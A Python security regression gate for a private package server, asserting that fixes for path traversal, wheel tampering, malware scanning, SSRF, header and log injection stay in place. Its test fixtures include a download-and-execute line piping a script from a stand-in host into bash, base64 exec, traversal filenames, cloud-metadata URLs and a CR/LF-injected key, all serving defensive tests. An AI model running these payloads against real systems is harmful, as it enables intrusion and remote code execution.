#!/usr/bin/env python
"""Gate: the SAST fixes for the 2026-09-20 report stay fixed.

Run from the backend directory (`backend/`)::

    python scripts/check_security.py

Companion to ``docs/security/pypiserver0920-findings.md``: that document says
which findings were real, which were false positives and what changed for the
real ones.  This gate turns the *real* ones into executable assertions, so a
later refactor cannot quietly undo them.

It is deliberately functional rather than textual where behaviour is what
matters — a traversal upload really is run through ``validate_file``, an
upload whose bytes were edited after it was built really is rejected, and a
forged log line really is emitted through a handler — and textual only for the
one artifact that has no runtime here, the DSH plugin's JavaScript, which is
read as source:

1. ``services/paths`` reduces a traversal filename and refuses a path that
   escapes its root (Werkzeug's ``secure_filename`` / ``safe_join``);
2. ``validate_file`` returns the *reduced* name, so the error strings that echo
   it and the destination the upload route builds are both safe;
3. an upload is proved against its own metadata: a wheel whose ``RECORD`` does
   not match its bytes, or that has no ``RECORD``, is refused by
   ``wheel.wheelfile.WheelFile`` rather than by archive code of ours;
4. GuardDog comes up **without an HTTP request** and rejects a package whose
   source carries malware indicators — the two properties that keep the scan
   both offline-safe and real;
5. ``services/urlsafety`` refuses non-HTTP schemes, embedded credentials and the
   link-local / cloud-metadata ranges, and accepts a real intranet endpoint;
6. ``normalize_api_key`` refuses a CR/LF-bearing key (request splitting into the
   upstream);
7. ``services/logsafe`` escapes a newline so one log record cannot forge a
   second line;
8. every JSON error response carries ``X-Content-Type-Options: nosniff``;
9. the plugin defaults to verifying TLS, has no baked-in platform address, and
   keeps the two opt-in downgrades;
10. the test-only gates carry no credential or address literals.
"""

from __future__ import annotations

import base64
import io
import logging
import os
import sys
import tempfile
import zipfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
PROJECT_ROOT = REPO_ROOT.parent
sys.path.insert(0, str(REPO_ROOT))
os.chdir(REPO_ROOT)

_TMP = Path(tempfile.mkdtemp(prefix="cpypi-security-"))
_PACKAGES = _TMP / "packages"
_PACKAGES.mkdir(parents=True, exist_ok=True)

#: A throwaway instance with a throwaway administrator, like every other gate.
_ADMIN = "securityadmin"
_PASSWORD = base64.urlsafe_b64encode(os.urandom(24)).decode().rstrip("=")
os.environ["API_KEYS_FILE"] = str(_TMP / "security.db")
os.environ["PACKAGES_DIR"] = str(_PACKAGES)
os.environ["AUTH_ENABLED"] = "true"
os.environ["AUTH_USERNAME"] = _ADMIN
os.environ["AUTH_ASSERT"] = _PASSWORD
os.environ["OAUTH2_INTROSPECT_URL"] = ""
os.environ["OAUTH2_AUTHORIZE_URL"] = ""
os.environ["ADMIN_USERS"] = f'["{_ADMIN}"]'
# GuardDog's pinned "top packages" cache belongs in the throwaway tree too, so
# the gate exercises the real seeding path instead of whatever a developer
# happens to have in data/.
os.environ["GUARDDOG_CACHE_DIR"] = str(_TMP / "guarddog")

from app import app  # noqa: E402 - imported late so the env above applies

from config import settings  # noqa: E402
from services import logsafe  # noqa: E402
from services.model_routes import normalize_api_key  # noqa: E402
from services.paths import contained, contained_resolved, safe_name  # noqa: E402
from services.urlsafety import UnsafeUrlError, check_outbound_url  # noqa: E402
from services.validation import (  # noqa: E402
    _get_guarddog,
    _reset_guarddog_for_test,
    validate_file,
)
from wheel.wheelfile import WheelFile  # noqa: E402

_AUTH = {"Authorization": "Basic " + base64.b64encode(f"{_ADMIN}:{_PASSWORD}".encode()).decode()}
_PLUGIN_SRC = (
    PROJECT_ROOT / "integrations" / "dsh-plugin-enterprise-intranet" / "lib" / "index.js"
)

#: Source that trips GuardDog's ``threat.process.download.execute`` and
#: ``threat.runtime.obfuscation.base64exec`` rules — the smallest thing that is
#: unambiguously malicious and needs no network to detect.
_MALICIOUS_SOURCE = (
    "import base64, os\n"
    'exec(base64.b64decode("cHJpbnQoJ2hpJyk="))\n'
    'os.system("curl http://evil.example/x.sh | bash")\n'
)

failures: list[str] = []


def check(ok: bool, label: str) -> None:
    print(("   ✅ " if ok else "   ✗ ") + label)
    if not ok:
        failures.append(label)


def _wheel_bytes(name: str, *, payload: str = "VALUE = 1\n") -> bytes:
    """A minimal but structurally real wheel, ``RECORD`` included.

    Written through :class:`WheelFile` rather than assembled by hand: the
    ``RECORD`` it produces is exactly what ``validate_file`` now verifies, so
    the fixture cannot drift from the format it is meant to satisfy.
    """
    dist_info = f"{name}-1.0.0.dist-info"
    with tempfile.TemporaryDirectory(prefix="cpypi-fixture-") as workdir:
        path = Path(workdir) / f"{name}-1.0.0-py3-none-any.whl"
        with WheelFile(str(path), "w") as wheel:
            wheel.writestr(f"{name}/__init__.py", payload)
            wheel.writestr(
                f"{dist_info}/WHEEL",
                "Wheel-Version: 1.0\nGenerator: check_security\n"
                "Root-Is-Purelib: true\nTag: py3-none-any\n",
            )
            wheel.writestr(
                f"{dist_info}/METADATA",
                f"Metadata-Version: 2.1\nName: {name}\nVersion: 1.0.0\n",
            )
        return path.read_bytes()


def _rewrite_wheel(
    payload: bytes,
    *,
    replace: dict[str, bytes] | None = None,
    add: dict[str, bytes] | None = None,
    drop: set[str] | None = None,
) -> bytes:
    """Rebuild *payload* as a new zip, editing members and leaving ``RECORD`` be.

    Because ``RECORD`` is copied unchanged, a member edited or added here is not
    covered by the hash recorded for it — which is the whole point of the
    fixture.
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(payload)) as source:
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as target:
            for info in source.infolist():
                if drop and info.filename in drop:
                    continue
                data = (replace or {}).get(info.filename, source.read(info))
                target.writestr(info, data)
            for name, data in (add or {}).items():
                target.writestr(name, data)
    return buffer.getvalue()



# ── 1/2. Path traversal ──────────────────────────────────────────────

def check_paths() -> None:
    print("── path traversal ──────────────────────────────────────────────")
    check(safe_name("../../etc/passwd") == "etc_passwd", "safe_name flattens a traversal name")
    check(
        safe_name("..\\..\\evil.whl") == "evil.whl",
        "safe_name strips a Windows-style traversal",
    )
    for bad in ("../outside", "a/../../b", "/etc/passwd"):
        try:
            contained(_PACKAGES, bad)
            check(False, f"contained refuses {bad}")
        except ValueError:
            check(True, f"contained refuses {bad}")
    check(contained(_PACKAGES, "ok.whl").parent == _PACKAGES, "contained keeps a plain name")

    # `contained` is lexical, and the one case it cannot see is a component that
    # *is* a symlink out of the root.  That is the case for a write target in a
    # tree someone else may have populated (a repository, a published root), so
    # the resolved variant exists and must refuse it.
    symlinked = _TMP / "paths-symlinked"
    (symlinked / "real").mkdir(parents=True, exist_ok=True)
    try:
        (symlinked / "escape").symlink_to(_TMP, target_is_directory=True)
    except (OSError, NotImplementedError):  # pragma: no cover - needs a privilege
        print("⚠ this platform cannot create symlinks — skipping the resolved containment check")
    else:
        check(
            contained(symlinked, "escape").is_dir(),
            "a symlinked component passes the lexical check (why the resolved variant exists)",
        )
        try:
            contained_resolved(symlinked, "escape")
            check(False, "contained_resolved refuses a symlinked escape")
        except ValueError:
            check(True, "contained_resolved refuses a symlinked escape")
        check(
            contained_resolved(symlinked, "real").is_dir(),
            "contained_resolved keeps a real component",
        )

    # The real pipeline: a traversal filename must come back *reduced*, which is
    # what makes both the echo (reflected XSS) and the destination (traversal)
    # safe downstream.
    payload = _wheel_bytes("evil")
    upload = io.BytesIO(payload)
    upload.filename = "../../evil-1.0.0-py3-none-any.whl"
    is_valid, result = validate_file(upload, upload.filename)
    check(is_valid, f"validate_file accepts a real wheel (got {result})")
    check(result == "evil-1.0.0-py3-none-any.whl", f"validate_file reduces the name (got {result})")
    check(not (_PACKAGES.parent / "evil-1.0.0-py3-none-any.whl").exists(),
          "nothing was written outside PACKAGES_DIR")


# ── 3. Wheel integrity ───────────────────────────────────────────────

def check_wheel_integrity() -> None:
    print()
    print("── wheel integrity (RECORD) ────────────────────────────────────")
    filename = "evil-1.0.0-py3-none-any.whl"
    intact = _wheel_bytes("evil")

    tampered = _rewrite_wheel(
        intact, replace={"evil/__init__.py": b"VALUE = 666  # edited after the build\n"}
    )
    is_valid, result = validate_file(io.BytesIO(tampered), filename)
    check(not is_valid and "Hash mismatch" in result,
          f"a wheel edited after it was built is refused (got {result})")

    unlisted = _rewrite_wheel(intact, add={"evil/extra.py": b"VALUE = 2\n"})
    is_valid, result = validate_file(io.BytesIO(unlisted), filename)
    check(not is_valid and "No hash found" in result,
          f"a member missing from RECORD is refused (got {result})")

    without_record = _rewrite_wheel(intact, drop={"evil-1.0.0.dist-info/RECORD"})
    is_valid, result = validate_file(io.BytesIO(without_record), filename)
    check(not is_valid and "RECORD" in result,
          f"a wheel without RECORD is refused (got {result})")

    bad_name = _wheel_bytes("evil")
    is_valid, result = validate_file(io.BytesIO(bad_name), "evil-1.0.0-py3-none.whl")
    check(not is_valid and "Invalid wheel filename" in result,
          f"a wheel filename with no platform tag is refused (got {result})")


# ── 4. GuardDog ──────────────────────────────────────────────────────

def check_guarddog() -> None:
    """GuardDog must come up offline and must still catch a malicious package.

    The ``requests.get`` spy is installed *before* the first import, because
    GuardDog refreshes its top-package lists while its modules are being
    imported; a regression there would put an unbounded HTTP request (no
    timeout) into an air-gapped deployment's first upload.
    """
    print()
    print("── guarddog (malware scan) ─────────────────────────────────────")
    import requests

    calls: list[str] = []
    real_get = requests.get

    def _blocked(url, *args, **kwargs):
        calls.append(str(url))
        raise requests.exceptions.ConnectionError("check_security blocked this request")

    requests.get = _blocked
    try:
        _reset_guarddog_for_test()
        scanner = _get_guarddog()
    finally:
        requests.get = real_get

    if scanner is None:
        print("   ⚠ GuardDog is not installed on this platform — scan assertions skipped")
        print("     (its nono-py dependency ships no Windows wheel; CI runs them)")
        return

    check(calls == [], f"GuardDog initialises without an HTTP request (got {calls})")
    check(
        Path(os.environ["GUARDDOG_CACHE_DIR"], "top_pypi_packages.json").is_file(),
        "the top-packages cache is seeded into GUARDDOG_CACHE_DIR",
    )

    is_valid, result = validate_file(
        io.BytesIO(_wheel_bytes("clean")), "clean-1.0.0-py3-none-any.whl"
    )
    check(is_valid, f"an ordinary wheel passes the malware scan (got {result})")

    is_valid, result = validate_file(
        io.BytesIO(_wheel_bytes("evil", payload=_MALICIOUS_SOURCE)),
        "evil-1.0.0-py3-none-any.whl",
    )
    check(not is_valid and "risk" in result,
          f"a wheel with malware indicators is refused (got {result})")

    # The failure policy mirrors ClamAV's: a scanner that cannot run warns and
    # lets the upload through, unless the deployment opted into refusing.  The
    # unusable cache below is a file where a directory has to be, which fails
    # GuardDog's bring-up on every platform.
    usable_cache = settings.security.guarddog_cache_dir
    blocked = _TMP / "not-a-directory"
    blocked.write_text("a file, so the cache directory cannot be created\n", encoding="utf-8")
    try:
        settings.security.guarddog_cache_dir = str(blocked / "guarddog")
        _reset_guarddog_for_test()
        settings.security.guarddog_required = True
        try:
            _get_guarddog()
            check(False, "GUARDDOG_REQUIRED=true refuses to run without a scanner")
        except RuntimeError:
            check(True, "GUARDDOG_REQUIRED=true refuses to run without a scanner")
        settings.security.guarddog_required = False
        _reset_guarddog_for_test()
        check(_get_guarddog() is None, "an unusable scanner only warns by default")
    finally:
        settings.security.guarddog_cache_dir = usable_cache
        settings.security.guarddog_required = False
        _reset_guarddog_for_test()


# ── 5/6. Outbound URL + header safety ────────────────────────────────

def check_urls() -> None:
    print()
    print("── outbound URL guard ──────────────────────────────────────────")
    # Literal addresses, not names: the guard resolves the host, and a gate must
    # not depend on DNS.  10.0.0.0/8 is a private range and stays allowed — the
    # model endpoints this product fronts are intranet services.
    allowed = check_outbound_url("http://10.0.0.5:8000/v1")
    check(allowed.startswith("http://10.0.0.5:8000/"), "a plain intranet endpoint passes")
    for bad, label in (
        ("file:///etc/passwd", "a file:// URL is refused"),
        ("http://user:pw@10.0.0.5/v1", "embedded credentials are refused"),
        ("http://169.254.169.254/latest/meta-data/", "the link-local metadata address is refused"),
        ("http://100.100.100.200/latest/meta-data/", "the CGNAT metadata address is refused"),
        ("http://metadata.google.internal/", "the metadata hostname is refused"),
    ):
        try:
            check_outbound_url(bad)
            check(False, label)
        except UnsafeUrlError:
            check(True, label)

    allowlist = ["10.0.0.5:8000"]
    try:
        check_outbound_url("http://10.0.0.6:8000/v1", allowed_hosts=allowlist)
        check(False, "a non-allow-listed host is refused")
    except UnsafeUrlError:
        check(True, "a non-allow-listed host is refused")
    check(
        check_outbound_url("http://10.0.0.5:8000/v1", allowed_hosts=allowlist).startswith("http://10.0.0.5"),
        "an allow-listed host passes",
    )

    try:
        normalize_api_key("sk-abc\r\nX-Injected: 1")
        check(False, "a CR/LF-bearing api_key is refused")
    except ValueError:
        check(True, "a CR/LF-bearing api_key is refused")
    check(normalize_api_key("  sk-abc  ") == "sk-abc", "a normal api_key is trimmed and kept")


# ── 5. Log forging ───────────────────────────────────────────────────

def check_logs() -> None:
    print()
    print("── log injection ───────────────────────────────────────────────")
    logger = logging.getLogger("cpypiserver.gate.security")
    logger.propagate = False
    logger.setLevel(logging.INFO)
    buffer = io.StringIO()
    handler = logging.StreamHandler(buffer)
    handler.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(handler)
    try:
        logsafe.install(logger)
        logger.warning("document %s", "evil\n2026-01-01 [cpypiserver] CRITICAL: forged")
    finally:
        logger.removeHandler(handler)

    lines = buffer.getvalue().splitlines()
    check(len(lines) == 1, f"a newline in a logged value stays on one line (got {len(lines)})")
    check(
        bool(lines) and "\\n2026-01-01" in lines[0] and "evil" in lines[0],
        "the control character is escaped and the value is still visible",
    )


# ── 6. Error envelope ────────────────────────────────────────────────

def check_error_headers() -> None:
    print()
    print("── JSON error envelope ─────────────────────────────────────────")
    client = app.test_client()
    # Both are domain errors routed through extensions/error_handlers.py: an
    # invalid bound query (the flask-openapi3 callback) and a missing project
    # (the PypiError handler).  Neither may answer without `nosniff`, because an
    # error body quotes the input it rejected.
    for url, want in (("/simple/?format=xml", 400), ("/simple/no-such-project-xyz/", 404)):
        response = client.get(url, headers=_AUTH)
        check(
            response.status_code == want,
            f"GET {url} -> {response.status_code} (want {want})",
        )
        check(
            response.headers.get("X-Content-Type-Options") == "nosniff",
            f"GET {url} carries X-Content-Type-Options: nosniff",
        )


# ── 7/8. Plugin + fixture hygiene ────────────────────────────────────

def check_plugin() -> None:
    print()
    print("── enterprise-intranet plugin ──────────────────────────────────")
    # The plugin was moved to its own branch (``plugin/enterprise-intranet``);
    # a checkout that does not carry it has no source to inspect, and that is a
    # skip rather than a regression.  When the file *is* present the assertions
    # run exactly as before, so the branch that owns the plugin still enforces
    # them.
    if not _PLUGIN_SRC.is_file():
        print(
            f"⚠ {_PLUGIN_SRC} is absent — the plugin lives on its own branch "
            "(plugin/enterprise-intranet); skipping its assertions."
        )
    else:
        source = _PLUGIN_SRC.read_text(encoding="utf-8")
        check("verifyTls: true" in source, "the plugin default verifies TLS")
        check("verifyTls = true" in source, "requestJson verifies TLS unless told otherwise")
        check("platformUrl: ''" in source, "no platform address is baked into the plugin")
        check("47.97.243.86" not in source, "the vendor IP is gone from the plugin source")
        check("VERIFY_TLS !== true" not in source, "the generated helper has no implicit downgrade")
        check("cfg.verifyTls !== true" not in source, "gitconfig has no implicit downgrade")
        check("rejectUnauthorized = false" in source, "the explicit opt-in downgrade still exists")
        check(
            "catch { options.rejectUnauthorized = false }" not in source,
            "an unreadable CA file fails closed instead of disabling verification",
        )

    print()
    print("── credential literals in test-only gates ──────────────────────")
    forbidden = {
        "backend/scripts/check_docker_proxy.py": ("devpass",),
        "backend/scripts/check_device_flow.py": (
            "device-gate-secret",
            "ZGV2aWNlYWRtaW46",
            "upstream-secret-key",
            "env-injected-key",
        ),
    }
    for relative, needles in forbidden.items():
        text = (PROJECT_ROOT / relative).read_text(encoding="utf-8")
        for needle in needles:
            check(needle not in text, f"{relative} no longer contains {needle}")


def main() -> int:
    # GuardDog first: the offline assertion below has to be the *first* import of
    # guarddog in this process, or the module-level refresh it guards against
    # would already have run outside the spy.
    check_guarddog()
    check_paths()
    check_wheel_integrity()
    check_urls()
    check_logs()
    check_error_headers()
    check_plugin()

    print()
    if failures:
        print(f"❌ security check FAILED — {len(failures)} problem(s)")
        return 1
    print("✅ security check passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
